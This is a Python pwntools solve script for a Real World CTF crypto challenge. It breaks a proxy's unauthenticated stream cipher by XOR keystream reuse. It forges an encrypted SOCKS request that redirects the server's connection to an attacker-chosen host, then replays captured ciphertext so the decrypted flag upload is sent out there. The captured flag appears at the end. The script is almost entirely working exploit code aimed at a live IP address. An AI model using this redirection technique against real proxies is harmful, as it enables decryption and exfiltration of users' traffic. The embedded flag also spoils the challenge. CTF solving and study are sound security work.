from binascii import unhexlify as unhex
from pwn import *

def xor(a, b):
    return bytes([x ^ y for x, y in zip(a, b)])

KS = unhex('7d07cba30c2a82cf2b2119e5ff2c')

host = bytes(map(int, '1.2.3.4'.split('.')))
port = 0x4141

context.log_level = 'ERROR'

'''
p0 = b'\x05\x06\x00\x01\x02\x03\x04\x05'
for i in range(256):
    r = remote('13.52.88.46', 50000)
    r.send(xor(p0, KS))
    d = r.recvn(2)
    assert d == b'\x78\x07'
    req = b'\x05\x01\x00\x03\x01'
    assert len(req) == len(KS[len(p0):])
    r.send(xor(req, KS[len(p0):]) + bytes([i]) + b'\xdd\xcc')
    d = r.recvn(4, timeout=1)
    print(i, xor(d, KS[2:]))
    r.close()
    '''

context.log_level = 'DEBUG'
req = b'\x05\x02\x00\x01' + b'\x05\x01\x00\x01' + host + p16(port)
assert len(req) == len(KS)
r = remote('13.52.88.46', 50000)
r.send(xor(req[:4], KS))
d = r.recvn(2)
assert d == b'\x78\x07'
r.send(xor(req[4:], KS[4:]))
d = r.recvn(10)
print(xor(d, KS[2:]))
raw = unhex('7ec2f5a654c86b20842b791c1a53a60938320f6854f6aca247b925c630db5de0ed489dca44a75b3cf48c14c200c5bf2ee27132d802905df15f4eda528cd7e4585f495c22402505d619f7819baa1c54625106d5767d62db32e24408f94a2c4430db00897c42ff20dba2e8c6cf6986fd1f1ac888c1946bbb65cdc61438f010d53262f93a6723c4568ab49b9741ca8c56e7b8aa9acafe5fcd367bd790d246e42460b9647de8844d4ffd573044a9d91da1efafc8e3dfa6fcf444285350382453932b04f8429daefb5846d4c2019cfee0f1118ba3e8be21ddc0eeb36322a6913e6f60bd2be59a62f440893599bfc3195e2578ae1ff26088726ce5739e9040710138aefee34c27552e8e0f62a6c8d30542a43077baef9a172a3e0babc9af331d17e0c4704d9f0c7642d4603008c1990021b9a5bd6b89c8c09d60d8e75af02109740987f58cae4713cad92fef9c0ccc5a094522904eda7510bf94276eef5cc87362a56477bae3803369ea4ff81cd4df24748276a5a1776841f4309391522ebf0fa222f20e2fe33d6b81f371e35479ba03a4d6b539c492aa92abda62cbb0167304f2826c0307b56ba8513163e46778')
r.send(raw)


'''
User-Agent: curl/7.74.0
Accept: */*
Content-Length: 236
Content-Type: multipart/form-data; boundary=------------------------2a2d903c655d5d18

--------------------------2a2d903c655d5d18
Content-Disposition: form-data; name="file"; filename="flag.txt"
Content-Type: text/plain

RWCTF{AEAD_1s_a_must_when_ch00s1ng_c1pher-meth0d}

--------------------------2a2d903c655d5d18--
'''

# RWCTF{AEAD_1s_a_must_when_ch00s1ng_c1pher-meth0d}
